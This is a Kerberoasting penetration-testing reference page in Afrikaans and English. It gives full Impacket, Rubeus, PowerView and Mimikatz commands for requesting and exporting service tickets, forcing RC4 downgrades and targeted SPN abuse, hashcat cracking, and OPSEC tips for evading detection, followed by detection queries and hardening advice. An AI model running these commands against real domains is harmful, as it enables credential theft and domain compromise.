# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting fokus op die verkryging van TGS-kaartjies, spesifiek dié wat verband hou met dienste wat onder gebruikersrekeninge in Active Directory (AD) loop, uitgesluit rekenaarrekeninge. Die enkripsie van hierdie kaartjies gebruik sleutels wat uit gebruikerswagwoorde aflei, wat offline-kraak van geloofsbriewe moontlik maak. Die gebruik van 'n gebruikersrekening as 'n diens word aangedui deur 'n nie-leë ServicePrincipalName (SPN)-eienskap.

Enige geverifieerde domeingebruiker kan TGS-kaartjies versoek, so geen spesiale voorregte is nodig nie.

### Belangrike punte

- Teiken TGS-kaartjies vir dienste wat onder gebruikersrekeninge loop (d.w.s. rekeninge met SPN gestel; nie rekenaarrekeninge nie).
- Kaartjies is versleuteld met 'n sleutel afgelei van die diensrekening se wagwoord en kan offline gekraak word.
- Geen verhoogde voorregte benodig nie; enige geverifieerde rekening kan TGS-kaartjies versoek.

> [!WARNING]
> Most public tools prefer requesting RC4-HMAC (etype 23) service tickets because they’re faster to crack than AES. RC4 TGS hashes start with `$krb5tgs$23$*`, AES128 with `$krb5tgs$17$*`, and AES256 with `$krb5tgs$18$*`. However, many environments are moving to AES-only. Do not assume only RC4 is relevant.
> Also, avoid “spray-and-pray” roasting. Rubeus’ default kerberoast can query and request tickets for all SPNs and is noisy. Enumerate and target interesting principals first.

### Service account secrets & Kerberos crypto cost

Baie dienste loop steeds onder gebruikersrekeninge met hand-befondsde wagwoorde. Die KDC enkripteer dienskaartjies met sleutels wat van daardie wagwoorde afgelei is en lewer die ciphertext aan enige geverifieerde principal, so kerberoasting gee onbeperkte offline-pogings sonder lockouts of DC-telemetrie. Die enkripsiemodus bepaal die kraakbegroting:

| Mode | Key derivation | Encryption type | Approx. RTX 5090 throughput* | Notes |
| --- | --- | --- | --- | --- |
| AES + PBKDF2 | PBKDF2-HMAC-SHA1 met 4,096 iterasies en 'n per-prinsipaal sout gegenereer uit die domein + SPN | etype 17/18 (`$krb5tgs$17$`, `$krb5tgs$18$`) | ~6.8 miljoen pogings/s | Sout blokkeer rainbow tables maar laat steeds vinnige kraak van kort wagwoorde toe. |
| RC4 + NT hash | Enkele MD4 van die wagwoord (onsout NT-hash); Kerberos meng slegs 'n 8-byte confounder per kaartjie | etype 23 (`$krb5tgs$23$`) | ~4.18 **miljard** pogings/s | ~1000× vinniger as AES; aanvallers dwing RC4 af wanneer `msDS-SupportedEncryptionTypes` dit toelaat. |

*Benchmarks van Chick3nman soos in [Matthew Green's Kerberoasting analysis](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/).

RC4 se confounder randomiseer slegs die keystream; dit voeg nie werk per poging by nie. Tensy diensrekeninge op ewekansige geheimen gebruik (gMSA/dMSA, machine accounts, of vault-managed strings), is kompromieksnelheid pure GPU-begroting. Die afdwing van AES-only etypes verwyder die miljard-pogings-per-sekonde agteruitgang, maar swak menslike wagwoorde val steeds vir PBKDF2.

### Aanval

#### Linux
```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```
Multi-funksie gereedskap insluitend kerberoast-kontroles:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```
#### Windows

- Enumereer kerberoastable gebruikers
```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```
- Tegniek 1: Vra vir TGS en dump uit die geheue
```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```
- Tegniek 2: Outomatiese gereedskap
```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```
> [!WARNING]
> 'n TGS-versoek genereer Windows Security Event 4769 ('n Kerberos dienskaartjie is versoek).

### OPSEC and AES-only environments

- Versoek RC4 doelbewus vir rekeninge sonder AES:
- Rubeus: `/rc4opsec` gebruik tgtdeleg om rekeninge sonder AES te enumereer en versoek RC4 dienskaartjies.
- Rubeus: `/tgtdeleg` saam met kerberoast aktiveer ook RC4-versoeke waar moontlik.
- Voer Roast op AES-only rekeninge uit in plaas van om stilweg te misluk:
- Rubeus: `/aes` enumereer rekeninge met AES geaktiveer en versoek AES dienskaartjies (etype 17/18).
- As jy reeds 'n TGT het (PTT of vanaf 'n .kirbi), kan jy `/ticket:<blob|path>` gebruik met `/spn:<SPN>` of `/spns:<file>` en LDAP oorslaan.
- Teiken, throttling en minder geraas:
- Gebruik `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` en `/jitter:<1-100>`.
- Filtreer vir waarskynlike swak wagwoorde deur `/pwdsetbefore:<MM-dd-yyyy>` (ouer wagwoorde) te gebruik of teiken bevoorregte OUs met `/ou:<DN>`.

Voorbeelde (Rubeus):
```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```
### Kraking
```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```
### Persistensie / Misbruik

As jy 'n rekening beheer of kan wysig, kan jy dit kerberoastable maak deur 'n SPN by te voeg:
```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```
Verlaag 'n rekening om RC4 in te skakel vir makliker cracking (vereis skryfprivilegies op die teikenobjek):
```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```
#### Targeted Kerberoast via GenericWrite/GenericAll oor 'n gebruiker (tydelike SPN)

Wanneer BloodHound aandui dat jy beheer oor 'n gebruikersobjek het (bv. GenericWrite/GenericAll), kan jy daardie spesifieke gebruiker betroubaar “targeted-roast” selfs al het hulle tans geen SPNs nie:

- Voeg 'n tydelike SPN by die beheerde gebruiker om dit roastable te maak.
- Versoek 'n TGS-REP wat met RC4 (etype 23) versleutel is vir daardie SPN om kraking te vergemaklik.
- Kraak die `$krb5tgs$23$...` hash met hashcat.
- Verwyder die SPN om die voetspoor te verminder.

Windows (PowerView/Rubeus):
```powershell
# Add temporary SPN on the target user
Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSvc-<rand>'} -Verbose

# Request RC4 TGS for that user (single target)
.\Rubeus.exe kerberoast /user:<targetUser> /nowrap /rc4

# Remove SPN afterwards
Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
```
Linux eenreël-opdrag (targetedKerberoast.py outomatiseer add SPN -> request TGS (etype 23) -> remove SPN):
```bash
targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
```
Kraak die uitset met hashcat autodetect (mode 13100 for `$krb5tgs$23$`):
```bash
hashcat <outfile>.hash /path/to/rockyou.txt
```
Detection notes: adding/removing SPNs produces directory changes (Event ID 5136/4738 on the target user) and the TGS request generates Event ID 4769. Consider throttling and prompt cleanup.

You can find useful tools for kerberoast attacks here: https://github.com/nidem/kerberoast

If you find this error from Linux: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)` it’s due to local time skew. Sync to the DC:

- `ntpdate <DC_IP>` (deprecated on some distros)
- `rdate -n <DC_IP>`

### Kerberoast without a domain account (AS-requested STs)

In September 2022, Charlie Clark showed that if a principal does not require pre-authentication, it’s possible to obtain a service ticket via a crafted KRB_AS_REQ by altering the sname in the request body, effectively getting a service ticket instead of a TGT. This mirrors AS-REP roasting and does not require valid domain credentials.

See details: Semperis write-up “New Attack Paths: AS-requested STs”.

> [!WARNING]
> Jy moet 'n lys van gebruikers verskaf, want sonder geldige geloofsbriewe kan jy nie LDAP navraag doen met hierdie tegniek nie.

Linux

- Impacket (PR #1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```
Windows

- Rubeus (PR #139):
```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```
Verwante

As jy AS-REP roastable users teiken, sien ook:

{{#ref}}
asreproast.md
{{#endref}}

### Opsporing

Kerberoasting kan onopgemerk wees. Soek na Event ID 4769 vanaf DCs en pas filters toe om geraas te verminder:

- Sluit diensnaam `krbtgt` en diensname wat eindig met `$` (rekenaarkonto's) uit.
- Sluit versoeke van masjienrekeninge (`*$$@*`) uit.
- Slegs suksesvolle versoeke (Failure Code `0x0`).
- Volg enkripsietipes: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`). Moenie slegs op `0x17` waarsku nie.

Voorbeeld PowerShell-triage:
```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
Where-Object {
($_.Message -notmatch 'krbtgt') -and
($_.Message -notmatch '\$$') -and
($_.Message -match 'Failure Code:\s+0x0') -and
($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
($_.Message -notmatch '\$@')
} |
Select-Object -ExpandProperty Message
```
Bykomende idees:

- Stel 'n basislyn vir normale SPN-gebruik per gasheer/gebruiker in; waarsku oor groot stote van verskillende SPN-versoeke vanaf 'n enkele prinsipaal.
- Merk ongewone RC4-gebruik in AES-verharde domeine.

### Mitigering / Verharding

- Gebruik gMSA/dMSA of masjienrekeninge vir dienste. Beheerde rekeninge het 120+ teken ewekansige wagwoorde en roteer outomaties, wat offline-kraak onprakties maak.
- Dwing AES op diensrekeninge af deur `msDS-SupportedEncryptionTypes` op AES-only te stel (decimal 24 / hex 0x18) en dan die wagwoord te roteer sodat AES-sleutels afgelei word.
- Skakel waar moontlik RC4 in jou omgewing uit en monitor vir pogings om RC4 te gebruik. Op DCs kan jy die `DefaultDomainSupportedEncTypes` registerwaarde gebruik om standaardwaardes te stel vir rekeninge sonder `msDS-SupportedEncryptionTypes`. Toets deeglik.
- Verwyder onnodige SPNs van gebruikersrekeninge.
- Gebruik lang, ewekansige diensrekening-wagwoorde (25+ karakters) as beheerde rekeninge nie haalbaar is nie; verbied algemene wagwoorde en doen gereelde ouditte.

## Verwysings

- [https://github.com/ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
- [Matthew Green – Kerberoasting: Low-Tech, High-Impact Attacks from Legacy Kerberos Crypto (2025-09-10)](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- [Microsoft Security Blog (2024-10-11) – Microsoft’s guidance to help mitigate Kerberoasting](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
- [SpecterOps – Rubeus Roasting documentation](https://docs.specterops.io/ghostpack/rubeus/roasting)
- [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)

{{#include ../../banners/hacktricks-training.md}}
